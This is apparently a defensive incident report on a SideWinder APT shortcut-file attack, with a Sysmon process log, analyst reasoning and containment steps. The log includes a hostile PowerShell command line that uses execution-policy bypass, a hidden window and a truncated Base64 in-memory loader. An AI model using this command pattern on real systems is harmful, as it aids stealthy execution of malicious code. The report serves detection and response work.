# Threat Execution Report: SideWinder APT (.lnk Payload)

## 1. Attack Overview
**Threat Actor:** SideWinder APT
**Vector:** Weaponized Shortcut (`.lnk`) File
**Objective:** Memory-resident execution bypassing static file analysis.

**Mechanics:** The attacker utilizes a malicious `.lnk` file disguised as a legitimate document. Upon user interaction, the shortcut executes a Living-off-the-Land Binary (LOLBin)—specifically `powershell.exe`—to load the malicious payload directly into memory, utilizing bypass flags to evade basic endpoint detection.

## 2. Raw Logs (Sysmon Event ID 1)
**Telemetry Source:** Windows Sysmon (Process Creation)

```json
{
  "EventID": 1,
  "RuleName": "Suspicious PowerShell Execution",
  "UtcTime": "2026-05-18 09:14:22.000",
  "ProcessGuid": "{1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d}",
  "ProcessId": 4012,
  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "FileVersion": "10.0.19041.1",
  "Description": "Windows PowerShell",
  "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...",
  "CurrentDirectory": "C:\\Users\\Victim\\Desktop\\",
  "User": "CORP\\Victim",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "ParentCommandLine": "C:\\Windows\\explorer.exe"
}


## 3. Operator Analysis
The extracted Sysmon telemetry confirms a targeted execution:
* **The Trigger (ParentImage):** The process was spawned by `explorer.exe`, indicating the user manually clicked the deceptive file on their Desktop.
* **The Evasion (CommandLine):** The attacker utilized `-WindowStyle Hidden` to execute without a console window appearing, and `-ExecutionPolicy Bypass` to circumvent local PowerShell restrictions.
* **The Payload (EncodedCommand):** A Base64 string was passed directly to the command line, preventing the payload from ever touching the disk where traditional Antivirus engines scan.

## 4. Detection Logic
*This section requires cross-linking to the Detection Engineering repository.*
* **Sigma Rule Deployment:** [Link to Sigma Rule for PowerShell Bypass Flags]
* **Wazuh XML Decoder:** [Link to Custom Decoder]

## 5. Response Strategy (Tier-1 Containment)
Upon validation of this Event ID 1 alert:
* **Network Containment:** Immediately isolate the affected host (`CORP\Victim`) from the internal network using EDR network quarantine to prevent C2 beaconing or lateral movement.
* **Process Termination:** Terminate the active `powershell.exe` process (PID: 4012).
* **Artifact Acquisition:** Retrieve the source `.lnk` file from `C:\Users\Victim\Desktop\` for reverse engineering and exact C2 extraction.
* **Credential Reset:** Force a password reset for `CORP\Victim` and revoke active session tokens.

## 6. Screenshots
*This section requires cross-linking to the Detection Engineering repository.*
* **SIEM Visualization:** [Link to Wazuh Alert Screenshot]
